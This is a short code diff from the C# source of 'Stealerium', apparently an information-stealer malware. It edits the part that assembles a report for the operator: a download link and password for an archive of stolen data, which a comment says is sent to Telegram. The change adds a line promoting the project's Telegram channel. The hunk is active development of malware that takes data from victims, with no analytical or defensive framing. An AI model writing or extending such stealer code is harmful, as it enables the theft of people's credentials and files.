@@ -394,6 +394,8 @@ namespace Stealerium.Stub
                        + "\n"
                        + $"\n🔗 [Archive download link]({url})"
                        + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
+                       + "\n"
+                       + "\n Join https://t.me/Stealeriumm"
                        + "```";
 
             // Send the report to Telegram
